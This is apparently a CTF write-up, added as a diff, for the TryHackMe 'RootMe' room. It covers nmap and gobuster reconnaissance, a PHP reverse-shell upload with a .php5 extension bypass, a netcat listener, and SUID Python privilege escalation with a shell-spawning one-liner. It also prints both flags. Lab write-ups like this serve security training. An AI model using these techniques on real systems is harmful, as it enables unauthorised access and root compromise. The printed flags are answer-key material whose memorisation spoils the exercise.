@@ -1,0 +1,130 @@
+# TRY HACK ME
+
+## ROOM [ RootMe ]
+
+---
+
+### Step 1 : Deploy the Machine
+
+Start by setting up the VPN connection.
+
+Install OpenVPN:
+sudo apt install openvpn
+
+Download the VPN configuration file from TryHackMe access page.
+
+Connect using OpenVPN:
+sudo openvpn <file-name>.ovpn
+
+Click Start Machine on THM and wait for the target IP to be assigned.
+
+---
+
+### Step 2 : Reconnaissance
+
+First, we scan the target to gather information.
+
+nmap -sS -A -T5 <IP>
+
+Results:
+- 2 ports open
+- Apache httpd 2.4.41
+- SSH running on port 22
+
+---
+
+### Step 3 : Directory Enumeration
+
+We use gobuster to find hidden directories.
+
+gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
+
+Found hidden directory:
+/panel/
+
+---
+
+### Step 4 : Web Access
+
+Open in browser:
+
+http://<IP>/panel
+
+This is a file upload page.
+
+---
+
+### Step 5 : Reverse Shell Upload
+
+We upload a PHP reverse shell.
+
+Before uploading:
+- Change IP in payload
+- Set port (example: 9999)
+- Rename file extension to .php5 (important)
+
+Other extensions like .php did NOT work, but .php5 worked successfully.
+
+---
+
+### Step 6 : Start Listener
+
+Open netcat listener:
+
+nc -nlvp 9999
+
+---
+
+### Step 7 : Get Shell Access
+
+After uploading shell and triggering it, we get a reverse shell.
+
+Find user flag:
+
+find -type f -name user.txt 2>/dev/null
+cat /var/www/user.txt
+
+---
+
+### USER FLAG
+
+THM{y0u_g0t_a_sh3ll}
+
+---
+
+### Step 8 : Privilege Escalation
+
+We search for SUID files:
+
+find / -type f -perm /4000 2>/dev/null
+
+We find an unusual binary:
+/usr/bin/python
+
+---
+
+### Step 9 : Root Exploitation
+
+Using GTFOBins method for Python SUID:
+
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+Now we are root.
+
+---
+
+### Step 10 : Root Flag
+
+Find root flag:
+
+find / -type f -name root.txt 2>/dev/null
+cat /root/root.txt
+
+---
+
+### ROOT FLAG
+
+THM{pr1v1l3g3_3sc4l4t10n}
+
+---
+
